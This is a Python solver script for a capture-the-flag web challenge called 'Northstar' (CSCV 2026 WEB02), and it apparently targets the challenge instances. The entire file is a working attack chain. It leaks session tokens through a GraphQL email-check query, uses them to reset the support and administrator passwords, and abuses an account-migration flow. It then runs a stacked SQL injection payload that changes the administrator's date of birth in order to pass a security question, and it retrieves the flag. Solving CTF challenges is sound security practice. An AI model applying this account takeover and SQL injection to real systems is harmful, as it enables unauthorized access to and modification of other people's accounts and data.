#!/usr/bin/env python3
"""End-to-end solver for CSCV 2026 WEB02 (Northstar).

The script follows the Classic -> Version 2 migration chain.  It intentionally
uses a Chrome-like User-Agent for Classic's browser-only GraphQL resolvers.
Override CLASSIC_HOST or V2_HOST when the instancer gives a different suffix.
"""

import base64
import json
import os
import re
import uuid

import requests
import urllib3


urllib3.disable_warnings()

CLASSIC_HOST = os.environ.get(
    "CLASSIC_HOST",
    "https://northstar-classic-e5c1456ee2d7.59.153.245.193.sslip.io",
).rstrip("/")
V2_HOST = os.environ.get(
    "V2_HOST",
    "https://northstar-e5c1456ee2d7.59.153.245.193.sslip.io",
).rstrip("/")
CHROME_UA = (
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
)
SUPPORT_PASSWORD = "SupportReset2026!"
ADMIN_PASSWORD = "AdminReset2026!"
KNOWN_DOB = "1990-01-01"

http = requests.Session()


def request_json(method, url, *, payload=None, headers=None):
    response = http.request(
        method,
        url,
        json=payload,
        headers=headers or {},
        verify=False,
        timeout=15,
    )
    try:
        body = response.json()
    except ValueError:
        body = {"raw": response.text}
    return response, body


def gql(query, variables=None, token=None, *, allow_errors=False):
    headers = {"Content-Type": "application/json", "User-Agent": CHROME_UA}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    response, body = request_json(
        "POST",
        f"{CLASSIC_HOST}/graphql",
        payload={"query": query, "variables": variables or {}},
        headers=headers,
    )
    if body.get("errors") and not allow_errors:
        raise RuntimeError(f"GraphQL {response.status_code}: {body['errors']}")
    return response, body


def check_email(email):
    query = """
      query($email: String!) {
        checkEmail(email: $email) { available message session }
      }
    """
    _, body = gql(query, {"email": email})
    result = body["data"]["checkEmail"]
    if not result.get("session"):
        raise RuntimeError(f"No session token for {email}: {result}")
    print(f"[+] checkEmail({email}) -> available={result.get('available')}")
    return result["session"]


def jwt_payload(token):
    part = token.split(".")[1]
    part += "=" * (-len(part) % 4)
    return json.loads(base64.urlsafe_b64decode(part))


def reset_classic_password(token, password):
    query = """
      mutation($newPassword: String!, $confirmNew: String!) {
        updateUserPassword(
          newPassword: $newPassword,
          confirmNew: $confirmNew
        ) { success message }
      }
    """
    _, body = gql(
        query,
        {"newPassword": password, "confirmNew": password},
        token,
    )
    result = body["data"]["updateUserPassword"]
    if not result.get("success"):
        raise RuntimeError(f"Password update failed: {result}")
    print(f"[+] Classic password reset: {result.get('message', 'success')}")


def v2(method, path, token=None, payload=None):
    headers = {"Content-Type": "application/json", "User-Agent": CHROME_UA}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    response, body = request_json(
        method,
        f"{V2_HOST}{path}",
        payload=payload,
        headers=headers,
    )
    return response, body


def create_v2_account():
    suffix = uuid.uuid4().hex[:10]
    payload = {
        "username": f"ctf_{suffix}",
        "email": f"ctf_{suffix}@example.com",
        "password": "V2Workspace2026!",
        "confirmPassword": "V2Workspace2026!",
    }
    response, body = v2("POST", "/api/register", payload=payload)
    if response.status_code not in (200, 201) or not body.get("access_token"):
        raise RuntimeError(f"V2 registration failed ({response.status_code}): {body}")
    print(f"[+] Created V2 account {payload['username']}")
    return body["access_token"]


def confirm_migration(token, ticket):
    response, body = v2(
        "POST",
        "/api/migration/confirm",
        token,
        {"legacy_user_id": ticket["legacy_user_id"], "migration_ticket": ticket["migration_ticket"]},
    )
    if response.status_code == 200:
        return body
    if response.status_code != 428:
        raise RuntimeError(f"Migration confirmation failed ({response.status_code}): {body}")

    question = body.get("question", "")
    print(f"[+] Security question: {question}")
    response, body = v2(
        "POST",
        "/api/migration/confirm",
        token,
        {
            "legacy_user_id": ticket["legacy_user_id"],
            "migration_ticket": ticket["migration_ticket"],
            "security_answer": KNOWN_DOB,
        },
    )
    if response.status_code != 200:
        raise RuntimeError(f"Migration retry failed ({response.status_code}): {body}")
    return body


def verify_and_confirm(token, identifier, password):
    response, ticket = v2(
        "POST",
        "/api/migration/verify",
        token,
        {"identifier": identifier, "password": password},
    )
    if response.status_code != 200 or not ticket.get("migration_ticket"):
        raise RuntimeError(f"Migration verification failed ({response.status_code}): {ticket}")
    print(
        f"[+] Verified Classic id={ticket.get('legacy_user_id')} "
        f"username={ticket.get('username')}"
    )
    result = confirm_migration(token, ticket)
    print(f"[+] Migration confirmed: {result}")
    return result


def find_admin_email(value):
    matches = []

    def walk(item):
        if isinstance(item, str):
            matches.extend(re.findall(r"[A-Za-z0-9._%+-]+@ctf\.local", item))
        elif isinstance(item, dict):
            for child in item.values():
                walk(child)
        elif isinstance(item, list):
            for child in item:
                walk(child)

    walk(value)
    for address in matches:
        if address.startswith("ops-admin-"):
            return address
    if matches:
        return matches[0]
    # The seeded challenge record is stable across the supplied instances.
    return "ops-admin-7f3@ctf.local"


def run():
    support_token = check_email("support@ctf.local")
    support_id = int(jwt_payload(support_token).get("sub", 2))
    print(f"[+] Support Classic id={support_id}")
    reset_classic_password(support_token, SUPPORT_PASSWORD)

    v2_token = create_v2_account()
    verify_and_confirm(v2_token, "support@ctf.local", SUPPORT_PASSWORD)

    _, account = v2("GET", "/api/account", v2_token)
    admin_email = find_admin_email(account)
    print(f"[+] Imported administrator address: {admin_email}")

    admin_token = check_email(admin_email)
    admin_id = int(jwt_payload(admin_token).get("sub", 3))
    print(f"[+] Administrator Classic id={admin_id}")
    reset_classic_password(admin_token, ADMIN_PASSWORD)

    payload = (
        "zzzz'; UPDATE users SET date_of_birth='1990-01-01' "
        f"WHERE id={admin_id}; --"
    )
    escaped = json.dumps(payload)
    query = f"{{accountDirectory(keyword:{escaped}){{id username email displayName}}}}"
    response, body = gql(query, token=admin_token, allow_errors=True)
    print(f"[+] DOB update primitive: HTTP {response.status_code} {body}")

    verify_and_confirm(v2_token, admin_email, ADMIN_PASSWORD)
    response, body = v2("GET", "/api/account", v2_token)
    if response.status_code != 200 or not body.get("admin_flag_available"):
        raise RuntimeError(f"Administrator migration did not unlock flag: {body}")

    response, body = v2("GET", "/api/admin/get-flag-1iduhx", v2_token)
    text = body.get("body", "") if isinstance(body, dict) else ""
    match = re.search(r"CSCV2026\{[^}]+\}", text)
    if not match:
        raise RuntimeError(f"Flag response did not contain a flag ({response.status_code}): {body}")
    print(match.group(0))


if __name__ == "__main__":
    run()
